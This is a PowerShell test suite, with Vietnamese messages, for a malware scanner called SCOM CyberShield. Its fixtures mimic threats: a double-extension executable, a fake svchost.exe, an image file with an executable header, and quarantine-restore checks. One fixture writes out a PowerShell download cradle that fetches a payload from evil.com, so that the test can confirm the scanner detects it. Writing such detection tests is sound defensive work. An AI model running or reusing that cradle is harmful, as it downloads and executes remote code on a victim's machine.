# ============================================================================
# SCOM CYBERSHIELD v3.0 - UNIT & INTEGRATION TESTS FOR CORE ENGINE
# ============================================================================
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$TestDir = Join-Path $env:TEMP "SCOM_Test_$(Get-Random)"
$TestQuarantine = Join-Path $TestDir "Quarantine"
New-Item -ItemType Directory -Path $TestDir -Force | Out-Null
New-Item -ItemType Directory -Path $TestQuarantine -Force | Out-Null

$EngineScript = Join-Path $PSScriptRoot "..\engine\core_scanner.ps1"
$passedCount = 0
$totalTests = 0

function Assert-Test {
    param([string]$Name, [bool]$Condition, [string]$Details = "")
    $script:totalTests++
    if ($Condition) {
        $script:passedCount++
        Write-Host " [PASS] $Name" -ForegroundColor Green
    } else {
        Write-Host " [FAIL] $Name : $Details" -ForegroundColor Red
    }
}

Write-Host "Bắt đầu kiểm thử tự động SCOM CyberShield v3.0 Core Engine..." -ForegroundColor Cyan
Write-Host "Thư mục test tạm: $TestDir`n" -ForegroundColor Gray

try {
    # TEST 1: Double Extension Detection
    $testFile1 = Join-Path $TestDir "contract.pdf.exe"
    Set-Content -Path $testFile1 -Value "Fake executable payload"
    $res1 = & $EngineScript -Mode "Custom" -TargetPath $testFile1 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện Đuôi kép (Double Extension)" -Condition ($res1.ThreatsCount -ge 1 -and $res1.Threats[0].Reason -like "*DoubleExtension*") -Details "Không phát hiện contract.pdf.exe"

    # TEST 2: Masquerade Fake System Process (svchost.exe outside System32)
    $testFile2 = Join-Path $TestDir "svchost.exe"
    Set-Content -Path $testFile2 -Value "Fake svchost"
    $res2 = & $EngineScript -Mode "Custom" -TargetPath $testFile2 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện Mạo danh Tiến trình Hệ thống (Masquerading)" -Condition ($res2.ThreatsCount -ge 1 -and $res2.Threats[0].Reason -like "*FakeSystemFile*") -Details "Không phát hiện svchost.exe ngoài System32"

    # TEST 3: MZ Header Inspection in Image & No File Handle Leak (PS-BUG-01)
    $testFile3 = Join-Path $TestDir "picture.jpg"
    $bytes = [byte[]]@(0x4D, 0x5A, 0x90, 0x00, 0x03)
    [System.IO.File]::WriteAllBytes($testFile3, $bytes)
    $res3 = & $EngineScript -Mode "Custom" -TargetPath $testFile3 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện MZ Header trong tệp ảnh (.jpg)" -Condition ($res3.ThreatsCount -ge 1 -and $res3.Threats[0].Reason -like "*DisguisedAsDocument*")

    # Kiểm tra giải phóng luồng (PS-BUG-01): File phải xóa hoặc ghi đè được ngay lập tức
    $fileLockReleased = $false
    try {
        [System.IO.File]::WriteAllBytes($testFile3, @(0x00, 0x01))
        $fileLockReleased = $true
    } catch {}
    Assert-Test -Name "Không bị rò rỉ khóa file sau khi quét MZ Header (PS-BUG-01)" -Condition ($fileLockReleased -eq $true) -Details "Tệp tin bị khóa cứng"

    # TEST 4: Malicious Script Detection
    $testFile4 = Join-Path $TestDir "downloader.ps1"
    Set-Content -Path $testFile4 -Value "powershell.exe -enc AAAA downloadstring('http://evil.com/payload.exe')"
    $res4 = & $EngineScript -Mode "Custom" -TargetPath $testFile4 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện Kịch bản tải mã độc (Download Cradle)" -Condition ($res4.ThreatsCount -ge 1 -and $res4.Threats[0].Reason -like "*PowerShellDownloadCradle*")

    # TEST 5: Auto-Quarantine & Restore Flow (PS-BUG-03, PS-BUG-04)
    $testFile5 = Join-Path $TestDir "invoice.pdf.exe"
    Set-Content -Path $testFile5 -Value "Threat to quarantine"
    $res5 = & $EngineScript -Mode "Custom" -TargetPath $testFile5 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive -AutoQuarantine | ConvertFrom-Json
    $isMoved = (-not (Test-Path $testFile5))
    $quarantineId = $res5.QuarantineResults[0].QuarantineId
    Assert-Test -Name "Tự động cách ly tệp độc hại an toàn" -Condition ($isMoved -and $quarantineId) -Details "Tệp chưa được di chuyển vào khu cách ly"

    # Kiểm tra khôi phục (Restore)
    $resRestore = & $EngineScript -Mode "QuarantineRestore" -RestoreId $quarantineId -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    $isRestored = (Test-Path $testFile5)
    Assert-Test -Name "Khôi phục tệp từ Khu cách ly về vị trí gốc nguyên vẹn" -Condition ($isRestored -and $resRestore.Status -eq "Success") -Details "Khôi phục thất bại"

    # TEST 6: JSON Output Format Verification (No non-JSON pollution)
    $jsonRaw = & $EngineScript -Mode "Custom" -TargetPath $testFile1 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive
    $isValidJson = $false
    try {
        $parsed = $jsonRaw | ConvertFrom-Json
        if ($parsed.Mode -eq "Custom") { $isValidJson = $true }
    } catch {}
    Assert-Test -Name "Đầu ra chuẩn JSON không bị dính chuỗi Console thừa" -Condition ($isValidJson -eq $true)

    # TEST 7: ProcessHunter with WinSxS (PS-BUG-05)
    $procRes = & $EngineScript -Mode "ProcessHunter" -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "ProcessHunter trả kết quả JSON hợp lệ" -Condition ($procRes.TotalProcesses -gt 0)

} finally {
    Remove-Item -Recurse -Force -Path $TestDir -ErrorAction SilentlyContinue
}

Write-Host "`n================================================================================" -ForegroundColor DarkGray
Write-Host "KẾT QUẢ KIỂM THỬ: $passedCount / $totalTests BÀI KIỂM TRA ĐẠT TRẠNG THÁI PASS!" -ForegroundColor $(if ($passedCount -eq $totalTests) { 'Green' } else { 'Red' })
Write-Host "================================================================================" -ForegroundColor DarkGray

if ($passedCount -ne $totalTests) {
    exit 1
}
